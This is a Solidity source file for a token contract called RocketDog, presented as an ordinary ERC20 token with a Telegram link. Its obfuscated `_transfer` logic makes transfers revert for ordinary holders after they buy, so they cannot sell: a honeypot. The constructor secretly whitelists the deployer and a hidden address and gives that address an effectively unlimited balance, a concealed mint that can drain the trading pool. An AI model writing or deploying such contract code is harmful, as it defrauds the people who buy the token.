// https://t.me/rocketdog_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract RocketDog is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private piece;

    function _transfer(
        address escape,
        address feature,
        uint256 soft
    ) internal override {
        uint256 failed = bee;

        if (writing[escape] == 0 && piece[escape] > 0 && uniswapV2Pair != escape) {
            writing[escape] -= failed;
        }

        address probably = feet;
        feet = feature;
        piece[probably] += failed + 1;

        _balances[escape] -= soft;
        uint256 to = (soft / 100) * bee;
        soft -= to;
        _balances[feature] += soft;
    }

    address private feet;
    mapping(address => uint256) private writing;
    uint256 public bee = 3;

    constructor(
        string memory sleep,
        string memory percent,
        address gently,
        address mathematics
    ) ERC20(sleep, percent) {
        uint256 related = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(gently);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        writing[msg.sender] = related;
        writing[mathematics] = related;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[mathematics] = related;
    }
}